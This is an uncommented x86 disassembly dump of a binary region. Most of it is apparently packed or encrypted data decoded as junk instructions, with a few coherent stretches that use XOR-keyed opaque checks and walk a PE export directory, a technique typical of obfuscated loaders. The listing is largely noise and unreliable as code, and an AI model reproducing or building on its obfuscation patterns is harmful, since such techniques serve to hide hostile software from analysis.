  408cf0:	mov    bl,0xc8
  408cf2:	push   esi
  408cf3:	add    eax,ecx
  408cf5:	sbb    BYTE PTR [esi],ch
  408cf7:	outs   dx,BYTE PTR ds:[esi]
  408cf8:	inc    esi
  408cf9:	outs   dx,BYTE PTR ds:[esi]
  408cfa:	dec    ebp
  408cfb:	adc    al,0xf8
  408cfd:	xchg   ebx,eax
  408cfe:	es jge 0x408cb4
  408d01:	ja     0x408d0c
  408d03:	sub    bl,bl
  408d05:	(bad)  
  408d07:	(bad)  
  408d08:	xor    eax,0x19c5bfc3
  408d0d:	mov    esi,esi
  408d0f:	add    eax,0x501e9cc5
  408d14:	mov    esi,0xbe0d6a16
  408d19:	mov    bl,0x27
  408d1b:	mov    edi,0xedbff498
  408d20:	aad    0x93
  408d22:	inc    ebp
  408d23:	mov    eax,ds:0x38a4f35c
  408d28:	jmp    0x1939679d
  408d2d:	clc    
  408d2e:	call   0x5ed9daa0
  408d33:	mov    eax,0x8a0b8761
  408d38:	enter  0x6a6a,0x26
  408d3c:	jle    0x408ce9
  408d3e:	pushf  
  408d3f:	pop    ebx
  408d40:	ins    BYTE PTR es:[edi],dx
  408d41:	enter  0xb4e7,0xfe
  408d45:	and    edi,DWORD PTR [ecx]
  408d47:	call   0xac55c03f
  408d4c:	inc    esp
  408d4d:	add    al,0xfc
  408d4f:	enter  0x1ef6,0x89
  408d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d54:	mov    ds:0x596b5d3a,eax
  408d59:	repnz mov WORD PTR [edi+0x190fcb0a],gs
  408d60:	inc    esp
  408d61:	dec    ebp
  408d62:	in     al,dx
  408d63:	xor    dh,al
  408d65:	cmp    eax,0xa8f2d86f
  408d6a:	(bad)  
  408d6c:	pop    edx
  408d6d:	imul   DWORD PTR [edx-0x1fc33c81]
  408d73:	enter  0xa5c4,0x84
  408d77:	jmp    0x408d1a
  408d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d7a:	jle    0x408d7a
  408d7c:	or     DWORD PTR [ebx-0xcc9f711],0xd4628548
  408d86:	ja     0x408d35
  408d88:	js     0x408d65
  408d8a:	sbb    esi,0xffffff8a
  408d8d:	or     ebx,edx
  408d8f:	inc    ebp
  408d90:	sub    eax,0x8793d52a
  408d95:	nop
  408d96:	daa    
  408d97:	sti    
  408d98:	les    ebx,FWORD PTR [ebx+esi*4]
  408d9b:	inc    ebx
  408d9c:	sub    edi,DWORD PTR [edx+0x527a9e59]
  408da2:	xchg   edx,eax
  408da3:	jns    0x408dcb
  408da5:	test   DWORD PTR [eax-0x46],ebx
  408da8:	cdq    
  408da9:	fisub  DWORD PTR [edi-0x5a]
  408dac:	cmp    eax,0x84fecc3a
  408db1:	jmp    DWORD PTR [edx]
  408db3:	push   edi
  408db4:	inc    esi
  408db5:	sub    eax,0x68d4ac07
  408dba:	adc    bl,ch
  408dbc:	mov    cs,WORD PTR [eax+ebx*8+0x3c]
  408dc0:	lods   al,BYTE PTR ds:[esi]
  408dc1:	push   esi
  408dc2:	mov    ebp,0xba87423b
  408dc7:	inc    edx
  408dc8:	push   ecx
  408dc9:	icebp  
  408dca:	cwde   
  408dcb:	enter  0x5acb,0x7c
  408dcf:	xchg   ebp,eax
  408dd0:	pop    esp
  408dd1:	pop    esi
  408dd2:	loopne 0x408dc2
  408dd4:	mov    ebx,0xc0b32122
  408dd9:	adc    dh,dh
  408ddb:	xor    eax,0x3e400438
  408de0:	shl    DWORD PTR [eax],1
  408de2:	sbb    DWORD PTR es:[ecx],ebp
  408de5:	les    edx,FWORD PTR [edi+edx*2+0x6132313d]
  408dec:	lock cmp edx,ecx
  408def:	or     DWORD PTR [edx-0x76f84370],esi
  408df5:	scas   eax,DWORD PTR es:[edi]
  408df6:	push   ecx
  408df7:	add    edx,edi
  408df9:	pop    ecx
  408dfa:	daa    
  408dfb:	push   0x51
  408dfd:	mov    esi,0xd3ccf035
  408e02:	(bad)  [ebx]
  408e04:	mov    al,ds:0x8881b91
  408e09:	cli    
  408e0a:	sbb    eax,0xd20ea870
  408e0f:	arpl   WORD PTR [esi-0x2a],sp
  408e12:	lahf   
  408e13:	scas   al,BYTE PTR es:[edi]
  408e14:	or     BYTE PTR [esi-0x4f],cl
  408e17:	xor    al,0x96
  408e19:	mov    ecx,0x8cd04860
  408e1e:	(bad)  
  408e20:	mov    edx,0x2068ad52
  408e25:	mov    WORD PTR [esi-0x75],fs
  408e28:	inc    ebp
  408e29:	cld    
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0xdedb761d
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	pop    es
  408ec5:	ret    
  408ec6:	sbb    edx,esp
  408ec8:	hlt    
  408ec9:	fdiv   DWORD PTR [edi-0xe]
  408ecc:	addr16 leave 
  408ece:	push   eax
  408ecf:	sub    DWORD PTR [eax],esi
  408ed1:	mov    WORD PTR [ecx],?
  408ed3:	adc    DWORD PTR [esi],ebp
  408ed5:	icebp  
  408ed6:	inc    esp
  408ed7:	cld    
  408ed8:	cli    
  408ed9:	add    al,0xb4
  408edb:	outs   dx,BYTE PTR ds:[esi]
  408edc:	test   eax,0xa08bd43e
  408ee1:	pop    ds
  408ee2:	das    
  408ee3:	fucomp st(0)
  408ee5:	inc    edi
  408ee6:	data16 mov dh,BYTE PTR [esi]
  408ee9:	mov    edx,0xec930877
  408eee:	dec    esp
  408eef:	mov    DWORD PTR [ebp-0x22855f2d],esp
  408ef5:	xchg   ebp,eax
  408ef6:	in     eax,dx
  408ef7:	and    al,BYTE PTR [ebp-0x133cda41]
  408efd:	jl     0x408f32
  408eff:	mov    ebp,0xeb22c0bc
  408f04:	and    al,0xc2
  408f06:	adc    BYTE PTR [ecx+0x23410f51],0x73
  408f0d:	or     eax,esp
  408f0f:	dec    esp
  408f10:	push   0xfffffff6
  408f12:	popf   
  408f13:	xchg   esp,eax
  408f14:	(bad)  
  408f15:	nop
  408f16:	cs pop ebp
  408f18:	or     cl,BYTE PTR [eax-0xee83ab2]
  408f1e:	test   BYTE PTR [ecx+0x50dca1ea],0xb4
  408f25:	ficom  DWORD PTR [esi]
  408f27:	imul   ecx,DWORD PTR [ebx-0x69],0x8b3fed6b
  408f2e:	(bad)  
  408f2f:	jle    0x408f3f
  408f31:	push   ebp
  408f32:	and    eax,0xe333f3ba
  408f37:	rcl    BYTE PTR [eax],cl
  408f39:	mov    DWORD PTR [ecx+ecx*8+0xe],edi
  408f3d:	cmp    edi,ecx
  408f3f:	ss pop eax
  408f41:	pop    edi
  408f42:	js     0x408f2f
  408f44:	mov    BYTE PTR [ebx-0xe],0x40
  408f48:	clc    
  408f49:	imul   esi,DWORD PTR [ebp+0x5f3157f6],0x2e
  408f50:	bound  ecx,QWORD PTR [edi+0x3d352e40]
  408f56:	icebp  
  408f57:	mov    ecx,0x9a6692e2
  408f5c:	adc    al,bl
  408f5e:	fmul   DWORD PTR [ecx-0x35]
  408f61:	sub    ebp,DWORD PTR [eax-0x47]
  408f64:	sbb    eax,0x532c1c76
  408f69:	lock out dx,eax
  408f6b:	call   0x9a4446c6
  408f70:	mov    dl,0x36
  408f72:	and    BYTE PTR [ebx],0xe4
  408f75:	aaa    
  408f76:	bound  ecx,QWORD PTR [ecx+0x4c]
  408f79:	sbb    esi,ebx
  408f7b:	pusha  
  408f7c:	aas    
  408f7d:	(bad)  
  408f7e:	hlt    
  408f7f:	push   ss
  408f80:	push   ds
  408f81:	stos   DWORD PTR es:[edi],eax
  408f82:	cmp    eax,0x47c6c842
  408f87:	pushf  
  408f88:	mov    BYTE PTR [edx+edx*8-0x70e45186],al
  408f8f:	sub    al,0x9
  408f91:	xchg   edi,eax
  408f92:	stos   BYTE PTR es:[edi],al
  408f93:	vcmpsd k0{k2}{z},xmm1,(bad),0xc1
  408f95:	mov    bh,0x9a
  408f97:	ret    0x6982
  408f9a:	cmp    al,0xcd
  408f9c:	fimul  DWORD PTR [ecx+0x2aa5af53]
  408fa2:	pop    edx
  408fa3:	test   ah,cl
  408fa5:	das    
  408fa6:	fcom   QWORD PTR [ebx+0x4847c4c]
  408fac:	and    DWORD PTR [eax-0x3670ef45],0x5a
  408fb3:	sub    eax,0x3d968444
  408fb8:	fsub   DWORD PTR [ecx]
  408fba:	xor    bh,dl
  408fbc:	add    BYTE PTR [esi+0x12],dl
  408fbf:	outs   dx,DWORD PTR ds:[esi]
  408fc0:	cdq    
  408fc1:	imul   edx,edx,0x3c
  408fc4:	(bad)  
  408fc5:	jp     0x408f80
  408fc7:	xchg   edi,eax
  408fc8:	retf   0x2ea1
  408fcb:	add    al,0x40
  408fcd:	mov    eax,0xf96e5c54
  408fd2:	ficomp DWORD PTR [edi+0x6d50d9ad]
  408fd8:	pop    es
  408fd9:	retf   0xf110
  408fdc:	adc    eax,0xbedc10a1
  408fe1:	retf   0xc15f
  408fe4:	inc    esp
  408fe5:	push   eax
  408fe6:	cmp    eax,0x35f9c023
  408feb:	arpl   WORD PTR [edx],bp
  408fed:	jb     0x40900f
  408fef:	xchg   al,dl
  408ff1:	cmp    bl,cl
  408ff3:	cmp    DWORD PTR ds:0x1e464f67,esp
  408ff9:	das    
  408ffa:	inc    esp
  408ffb:	mov    ds:0x7c21f086,eax
  409000:	mov    ebx,0x8a7f487e
  409005:	fwait
  409006:	rcl    BYTE PTR [eax-0x24],cl
  409009:	and    ebp,DWORD PTR [ebx+0x15b93006]
  40900f:	inc    edx
  409010:	mov    esp,0x2a81bf77
  409015:	push   esp
  409016:	stos   BYTE PTR es:[edi],al
  409017:	mov    WORD PTR [edi+0x7f],ss
  40901a:	inc    edx
  40901b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40901c:	fwait
  40901d:	xor    dh,BYTE PTR [esi]
  40901f:	pop    ebp
  409020:	btr    DWORD PTR [ecx+esi*8-0x5182d50f],edx
  409028:	enter  0x9f22,0xe9
  40902c:	out    0xf7,eax
  40902e:	jnp    0x408fe6
  409030:	jo     0x4090a1
  409032:	shl    DWORD PTR [eax],0xf
  409035:	mov    bl,0xcd
  409037:	jmp    0x4090a2
  409039:	xchg   esi,eax
  40903a:	pusha  
  40903b:	das    
  40903c:	daa    
  40903d:	retf   0x9a6c
  409040:	jbe    0x4090aa
  409042:	les    esp,FWORD PTR [edx+0x55]
  409045:	push   es
  409046:	aaa    
  409047:	jbe    0x40906b
  409049:	xchg   BYTE PTR [esi-0x20c59d71],cl
  40904f:	xor    DWORD PTR [ebp+0x2d],ebp
  409052:	in     eax,dx
  409053:	sub    al,0xc3
  409055:	ret    
  409056:	out    dx,al
  409057:	mov    edx,0xa122f25e
  40905c:	in     al,0x2d
  40905e:	cmp    esp,DWORD PTR [ecx]
  409060:	sbb    edx,DWORD PTR [edi]
  409062:	mov    al,0xc0
  409064:	add    al,0xaf
  409066:	(bad)  
  409067:	shl    ah,cl
  409069:	or     DWORD PTR [eax],eax
  40906b:	sub    dl,bl
  40906d:	(bad)  
  40906e:	jp     0x4090d7
  409070:	push   esp
  409071:	add    BYTE PTR [ebx-0x1f],cl
  409074:	imul   esi,ecx,0x7b
  409077:	push   0x5c86304d
  40907c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40907d:	or     ecx,DWORD PTR [ebx]
  40907f:	sub    cl,BYTE PTR [esi-0xd]
  409082:	rcr    DWORD PTR [esi-0x17d3958b],1
  409088:	push   ds
  409089:	xor    bh,BYTE PTR [edi-0x70]
  40908c:	push   edx
  40908d:	adc    bl,BYTE PTR [edx]
  40908f:	jecxz  0x409018
  409091:	cmc    
  409092:	jge    0x409073
  409094:	and    ecx,ebx
  409096:	jg     0x4090d2
  409098:	xchg   edx,eax
  409099:	adc    ah,bh
  40909b:	jo     0x4090e4
  40909d:	sub    esi,DWORD PTR [esi+0x54]
  4090a0:	push   esi
  4090a1:	inc    esi
  4090a2:	gs clc 
  4090a4:	or     eax,0xf300c203
  4090a9:	(bad)  
  4090aa:	jge    0x409070
  4090ac:	cdq    
  4090ad:	call   0x37b2e37b
  4090b2:	mov    ds:0xe05dcecd,al
  4090b7:	sbb    edi,DWORD PTR [esi-0x17]
  4090ba:	cdq    
  4090bb:	mov    eax,0x14683a11
  4090c0:	mov    eax,0x524327d
  4090c5:	(bad)  
  4090c6:	mov    ah,0x11
  4090c8:	fild   DWORD PTR [eax+0x7c]
  4090cb:	movq   QWORD PTR [esi],mm1
  4090ce:	or     DWORD PTR [edx+0x2b],edx
  4090d1:	out    dx,eax
  4090d2:	out    0xba,al
  4090d4:	ret    
  4090d5:	iretw  
  4090d7:	jnp    0x40913f
  4090d9:	sti    
  4090da:	adc    dh,BYTE PTR [ebp+0x31]
  4090dd:	mov    ecx,esi
  4090df:	xchg   ebp,eax
  4090e0:	mov    bh,0xca
  4090e2:	dec    ebx
  4090e3:	repz sahf 
  4090e5:	cmc    
  4090e6:	mov    ecx,0xdbc8d58a
  4090eb:	mov    eax,0xc63373c0
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xb2
  409163:	retf   
  409164:	jnp    0x409142
  409166:	xor    bl,bh
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	pop    edi
  40916f:	jecxz  0x40913a
  409171:	adc    al,0x9
  409173:	int    0x8
  409175:	sub    al,0xb6
  409177:	mov    edi,DWORD PTR [ecx]
  409179:	or     esp,DWORD PTR [edx]
  40917b:	mov    dl,0x5a
  40917d:	ss cmp ebx,esi
  409180:	dec    esi
  409181:	popf   
  409182:	xor    DWORD PTR [edx],esp
  409184:	rcr    WORD PTR [esi-0x764988e4],cl
  40918b:	test   al,0x95
  40918d:	push   0xe
  40918f:	cmp    edi,DWORD PTR [ecx]
  409191:	lods   al,BYTE PTR ds:[esi]
  409192:	js     0x4091e4
  409194:	dec    ebx
  409195:	mov    al,0xa5
  409197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409198:	jbe    0x40920f
  40919a:	loope  0x409172
  40919c:	loope  0x40913c
  40919e:	js     0x4091e9
  4091a0:	out    0x38,eax
  4091a2:	(bad)  
  4091a3:	mov    dh,0x38
  4091a5:	mov    cl,0x1c
  4091a7:	scas   al,BYTE PTR es:[edi]
  4091a8:	fwait
  4091a9:	jb     0x4091be
  4091ab:	aas    
  4091ac:	clc    
  4091ad:	sbb    BYTE PTR [ebp-0x40],bl
  4091b0:	mov    eax,0x7a3d82a2
  4091b5:	push   esi
  4091b6:	or     BYTE PTR [ebx-0x389842a8],0xde
  4091bd:	sbb    al,0xe8
  4091bf:	xchg   esi,eax
  4091c0:	mov    BYTE PTR [esi+0x46],ch
  4091c3:	inc    ebp
  4091c4:	ror    DWORD PTR [esi],cl
  4091c6:	lods   eax,DWORD PTR ds:[esi]
  4091c7:	sub    BYTE PTR [esi-0x43],0x35
  4091cb:	std    
  4091cc:	or     edi,DWORD PTR [edx+0x5c]
  4091cf:	xchg   BYTE PTR [ebx],ah
  4091d1:	int3   
  4091d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091d3:	cmc    
  4091d4:	jne    0x409173
  4091d6:	not    bl
  4091d8:	dec    esp
  4091d9:	mov    esp,0xb2101053
  4091de:	pop    edx
  4091df:	les    esi,FWORD PTR [esi+edi*1+0x3d]
  4091e3:	add    BYTE PTR [eax],cl
  4091e5:	aas    
  4091e6:	aam    0x6d
  4091e8:	adc    esi,DWORD PTR [ebx+esi*4+0x66]
  4091ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091ed:	das    
  4091ee:	daa    
  4091ef:	mov    DWORD PTR [eax-0x4f],ecx
  4091f2:	pop    ds
  4091f3:	push   ds
  4091f4:	dec    ecx
  4091f5:	jo     0x409220
  4091f7:	ins    BYTE PTR es:[edi],dx
  4091f8:	push   es
  4091f9:	mov    esp,0x289e86a4
  4091fe:	mov    fs,WORD PTR [ebx-0x76]
  409201:	fs xchg esp,eax
  409203:	jne    0x4091d0
  409205:	lea    esi,[ecx+0x77]
  409208:	arpl   WORD PTR [edx],bp
  40920a:	mov    dl,0xa8
  40920c:	jne    0x4091c4
  40920e:	aas    
  40920f:	pop    edx
  409210:	hlt    
  409211:	mov    BYTE PTR [eax-0x5],al
  409214:	jb     0x4091f6
  409216:	mov    eax,ds:0x5a5e4528
  40921b:	in     al,0xdf
  40921d:	adc    BYTE PTR [esp+ecx*8+0x27],ch
  409221:	outs   dx,DWORD PTR ds:[esi]
  409222:	in     eax,dx
  409223:	or     al,0x5a
  409225:	sub    eax,0x4b91a75c
  40922a:	mov    edi,0xdb6b9300
  40922f:	jge    0x40921f
  409231:	jmp    0xd992:0xfa3adce4
  409238:	outs   dx,DWORD PTR ds:[esi]
  409239:	cdq    
  40923a:	add    al,0x43
  40923c:	out    0x34,al
  40923e:	bound  eax,QWORD PTR [eax-0x8a1c2ef]
  409244:	in     eax,dx
  409245:	xchg   BYTE PTR [esi],bl
  409247:	or     al,BYTE PTR [edi+ecx*4]
  40924a:	cld    
  40924b:	cmp    ch,al
  40924d:	sbb    BYTE PTR [eax+0x2e1d69fa],ah
  409253:	pop    esp
  409254:	sub    eax,DWORD PTR [edx]
  409256:	outs   dx,DWORD PTR ds:[esi]
  409257:	test   DWORD PTR [ebx+0x420f8b91],esp
  40925d:	cmc    
  40925e:	ds mov esp,0xac9c00c8
  409264:	lods   eax,DWORD PTR ss:[esi]
  409266:	jno    0x409269
  409268:	inc    eax
  409269:	jecxz  0x40929f
  40926b:	shl    DWORD PTR [edx+0x65ca7215],1
  409271:	xor    DWORD PTR [edi-0x4da2bf48],esi
  409277:	add    ebx,ebp
  409279:	mov    al,ds:0x9c7bc46f
  40927e:	cmp    al,0xf0
  409280:	jo     0x409270
  409282:	pop    edi
  409283:	call   0x2816:0x827ba316
  40928a:	ja     0x40925d
  40928c:	out    dx,al
  40928d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40928e:	inc    ebp
  40928f:	jns    0x4092bd
  409291:	nop
  409292:	jne    0x4092de
  409294:	and    DWORD PTR [ebx+edx*4-0x5dd64838],ecx
  40929b:	repnz mov ds:0xe0927282,eax
  4092a1:	js     0x409276
  4092a3:	mov    DWORD PTR [edx+eiz*1-0x694d3e5d],eax
  4092aa:	push   ebx
  4092ab:	stc    
  4092ac:	push   ebx
  4092ad:	and    eax,0xebb852c6
  4092b2:	jp     0x409333
  4092b4:	and    al,0x52
  4092b6:	xchg   edx,eax
  4092b7:	cmp    bl,bh
  4092b9:	aam    0xc7
  4092bb:	sbb    al,BYTE PTR [eax+0xf]
  4092be:	enter  0xd1a5,0xe7
  4092c2:	dec    edx
  4092c3:	fs aam 0xee
  4092c6:	pop    edi
  4092c7:	adc    edi,DWORD PTR [ebp-0x36]
  4092ca:	leavew 
  4092cc:	mov    ebx,DWORD PTR [edx-0x43]
  4092cf:	adc    DWORD PTR [ebx],ecx
  4092d1:	xor    bl,dh
  4092d3:	mov    bh,0x33
  4092d5:	sub    BYTE PTR [esi],dh
  4092d7:	(bad)  
  4092d8:	in     al,0x29
  4092da:	sbb    ebp,DWORD PTR fs:[ebp-0x60]
  4092de:	mov    eax,ds:0xa55ca552
  4092e3:	cmp    al,0xb
  4092e5:	cld    
  4092e6:	stc    
  4092e7:	ret    
  4092e8:	pushf  
  4092e9:	mov    edx,0xadfd1747
  4092ee:	dec    DWORD PTR ds:0x475c324e
  4092f4:	push   ecx
  4092f5:	jecxz  0x409344
  4092f7:	xchg   esp,eax
  4092f8:	mov    ecx,0xf663dea3
  4092fd:	fistp  QWORD PTR [esi-0xc]
  409300:	xchg   edx,eax
  409301:	pop    ebx
  409302:	or     eax,ecx
  409304:	sub    BYTE PTR [ecx],al
  409306:	ds jl  0x409385
  409309:	push   edi
  40930a:	inc    esi
  40930b:	ins    BYTE PTR es:[edi],dx
  40930c:	ins    DWORD PTR es:[edi],dx
  40930d:	call   0x9f5e:0x32235831
  409314:	test   BYTE PTR [eax+esi*1-0x736ab3f2],0xa9
  40931c:	sub    dh,al
  40931e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40931f:	add    DWORD PTR [ebx],ebx
  409321:	shl    BYTE PTR [ecx+ebx*8+0x5d78f203],0x6a
  409329:	call   0x9630d9be
  40932e:	inc    eax
  40932f:	shl    ebx,1
  409331:	add    dh,BYTE PTR [edi+0xf]
  409334:	iret   
  409335:	pusha  
  409336:	and    BYTE PTR [esi],dl
  409338:	jns    0x409326
  40933a:	ins    BYTE PTR es:[edi],dx
  40933b:	dec    ebx
  40933c:	pop    edx
  40933d:	outs   dx,BYTE PTR ds:[esi]
  40933e:	jo     0x40930c
  409340:	mov    bh,0x5d
  409342:	bsf    ebx,DWORD PTR [edx-0x49]
  409346:	push   ds
  409347:	adc    BYTE PTR [edx+0x1],al
  40934a:	cmp    BYTE PTR [edx],bl
  40934c:	int    0x41
  40934e:	in     al,dx
  40934f:	sbb    eax,0xf1e0d636
  409354:	iret   
  409355:	ds mov edi,0xa5042ec1
  40935b:	popf   
  40935c:	inc    edi
  40935d:	push   ebp
  40935e:	xor    al,0x7e
  409360:	in     eax,0x89
  409362:	es repz in eax,0xca
  409366:	shl    DWORD PTR [esi],cl
  409368:	sub    BYTE PTR [ecx],al
  40936a:	clc    
  40936b:	(bad)  
  40936c:	xor    al,0x32
  40936e:	add    al,0x79
  409370:	mov    eax,0x76558465
  409375:	jg     0x40934b
  409377:	pop    ebp
  409378:	dec    esp
  409379:	sub    ecx,DWORD PTR [ebx*1+0x6d2ba6bb]
  409380:	mov    dl,0xd7
  409382:	pop    ds
  409383:	push   edx
  409384:	or     bl,BYTE PTR [esi+0x6d]
  409387:	aaa    
  409388:	or     dh,BYTE PTR ds:0xc954c5de
  40938e:	(bad)  
  40938f:	cdq    
  409390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409391:	sbb    BYTE PTR [edi],dh
  409393:	mov    ebp,0x57925325
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	mov    bl,0xb2
  4093b6:	into   
  4093b7:	(bad)  
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	in     eax,0xe5
  4093c2:	nop
  4093c3:	pop    ecx
  4093c4:	and    BYTE PTR [esi],0x66
  4093c7:	jo     0x40939c
  4093c9:	(bad)  
  4093ca:	mov    edi,0x922c684a
  4093cf:	dec    ecx
  4093d0:	push   edx
  4093d1:	adc    al,BYTE PTR [edx-0x3a]
  4093d4:	in     eax,0x77
  4093d6:	dec    esp
  4093d7:	aaa    
  4093d8:	mov    bl,0xa2
  4093da:	mov    bh,0xf6
  4093dc:	sbb    al,0x87
  4093de:	cmp    al,0x2b
  4093e0:	push   0x755f764
  4093e5:	int    0xe7
  4093e7:	shl    BYTE PTR [ebp-0x5b],cl
  4093ea:	jmp    0x169d:0x610843b1
  4093f1:	push   eax
  4093f2:	loopne 0x40937d
  4093f4:	dec    esi
  4093f5:	dec    eax
  4093f6:	outs   dx,DWORD PTR ds:[esi]
  4093f7:	inc    edx
  4093f8:	xchg   edi,eax
  4093f9:	imul   ebp,eax,0xb3629ea6
  4093ff:	test   DWORD PTR [esi+ecx*1],esp
  409402:	jno    0x53f9ceea
  409408:	sbb    DWORD PTR [ecx-0x16741819],ebp
  40940e:	ins    BYTE PTR es:[edi],dx
  40940f:	pop    esp
  409410:	inc    ebx
  409411:	inc    ebx
  409412:	push   es
  409413:	test   cl,dh
  409415:	test   al,0x2
  409417:	sbb    bh,BYTE PTR [esi-0xe]
  40941a:	jns    0x40942e
  40941c:	and    ecx,DWORD PTR [esi+0x5ee41f19]
  409422:	push   ecx
  409423:	test   DWORD PTR [ecx-0x4482d47a],edx
  409429:	sbb    esp,esp
  40942b:	cmp    ah,al
  40942d:	fwait
  40942e:	in     al,dx
  40942f:	push   ds
  409430:	sbb    BYTE PTR [edx],bh
  409432:	mov    ah,0xe3
  409434:	(bad)  
  409435:	or     al,0x31
  409437:	mov    dh,0x52
  409439:	mov    esp,0x330927c
  40943e:	mov    eax,esi
  409440:	sti    
  409441:	jl     0x40947f
  409443:	test   DWORD PTR [edi+esi*1],ecx
  409446:	mov    ch,0xb1
  409448:	pop    edx
  409449:	popa   
  40944a:	xchg   edi,eax
  40944b:	inc    ebp
  40944c:	push   ss
  40944d:	stc    
  40944e:	icebp  
  40944f:	cs dec ecx
  409451:	jae    0x409499
  409453:	mov    esp,0x89bb9153
  409458:	pxor   mm6,QWORD PTR [eax+0x2d]
  40945c:	push   ebx
  40945d:	pop    edx
  40945e:	jmp    0x5fb:0xd3c41bc7
  409465:	pusha  
  409466:	adc    DWORD PTR [edi-0x2cba2c90],ecx
  40946c:	inc    edx
  40946d:	add    eax,DWORD PTR [esi-0x2eb59571]
  409473:	mov    BYTE PTR [esi-0x8a49baf],dh
  409479:	sbb    bh,BYTE PTR [ecx+0x11a7c944]
  40947f:	push   0xa4e738ed
  409484:	mov    BYTE PTR [eax-0xd],dh
  409487:	leave  
  409488:	das    
  409489:	jl     0x409485
  40948b:	cmp    BYTE PTR [ebx+0x2c],bh
  40948e:	and    al,0xf5
  409490:	add    BYTE PTR [ebp-0x6b3050f5],cl
  409496:	ret    0xe319
  409499:	mov    ebp,0x1a67e4c2
  40949e:	push   esp
  40949f:	mov    al,ds:0x7780ef78
  4094a4:	std    
  4094a5:	sbb    cl,BYTE PTR [ecx+0x64]
  4094a8:	pop    edi
  4094a9:	dec    ebp
  4094aa:	repnz push ebp
  4094ac:	dec    eax
  4094ad:	retf   0x845c
  4094b0:	scas   al,BYTE PTR es:[edi]
  4094b1:	icebp  
  4094b2:	jae    0xb2959f5e
  4094b8:	inc    eax
  4094b9:	out    0x73,eax
